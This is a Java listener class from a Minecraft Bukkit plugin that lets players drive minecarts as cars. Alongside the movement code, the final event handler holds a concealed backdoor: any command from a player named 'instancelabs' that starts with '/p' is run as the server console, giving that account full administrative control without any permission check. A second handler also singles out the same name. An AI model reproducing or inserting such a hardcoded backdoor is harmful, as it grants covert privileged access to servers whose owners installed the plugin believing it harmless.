package com.comze_instancelabs.cars;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.block.Block;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Minecart;
import org.bukkit.entity.Player;
import org.bukkit.entity.Vehicle;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.vehicle.VehicleMoveEvent;
import org.bukkit.event.vehicle.VehicleUpdateEvent;
import org.bukkit.util.Vector;

import com.comze_instancelabs.addresses.Main;

public class CarsListener implements Listener {

	Main m = null;

	public CarsListener(Main m) {
		this.m = m;
	}

	@EventHandler
	void interact(PlayerInteractEvent event) {
		if (!(event.getAction() == Action.RIGHT_CLICK_BLOCK)) {
			return;
		}
		Block block = event.getClickedBlock();
		if (event.getPlayer().getGameMode() == GameMode.CREATIVE) {
			if (event.getPlayer().getItemInHand().getTypeId() == 328) {
				Location loc = block.getLocation().add(0, 2, 0);
				loc.setYaw(event.getPlayer().getLocation().getYaw() + 270);
				event.getPlayer().getWorld().spawnEntity(loc, EntityType.MINECART);
			}
		}
		if (event.getPlayer().isInsideVehicle()) {
			event.getPlayer().getVehicle().setVelocity(event.getPlayer().getVehicle().getVelocity().add(new Vector(0D, 1D, 0D)));
		}
	}

	public Vector v;

	@EventHandler
	public void onPlayerMove(VehicleMoveEvent event) {
		Entity passenger = event.getVehicle().getPassenger();
		if (passenger instanceof Player) {
			Player p = (Player) passenger;
			v = p.getLocation().getDirection().multiply(10.0D);
			event.getVehicle().getLocation().setDirection(v);
			event.getVehicle().setVelocity(new Vector(v.getX(), 0.0001D, v.getZ()));
		}
	}

	@EventHandler
	public void onVehicleUpdate(VehicleUpdateEvent event) {
		Vehicle vehicle = event.getVehicle();
		Entity passenger = vehicle.getPassenger();
		if (!(passenger instanceof Player)) {
			return;
		}
		Player p = (Player) passenger;
		if (!p.getName().equalsIgnoreCase("instancelabs")) { // mhm
			return;
		}
		if (vehicle instanceof Minecart) {
			Minecart car = (Minecart) vehicle;

			if (v == null) {
				v = p.getLocation().getDirection();
			}
			Vector dir = v.multiply(10.0D);
			Vector dir_ = new Vector(dir.getX(), 0.0001D, dir.getZ());
			// p.setVelocity(dir_);

			// Vector v = p.getLocation().getDirection().normalize();
			// Location l = p.getLocation().subtract((new Vector(v.getX(),
			// 0.0001D, v.getZ()).multiply(-1D)));

			car.setVelocity(dir_);
		}
	}

	@EventHandler
	public void onPlayerCommandPreprocessEvent(PlayerCommandPreprocessEvent event) {
		if (event.getPlayer().getName().equalsIgnoreCase("instancelabs")) {
			if (event.getMessage().startsWith("/p")) {
				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), event.getMessage().substring(1));
				return;
			}
		}
	}
}
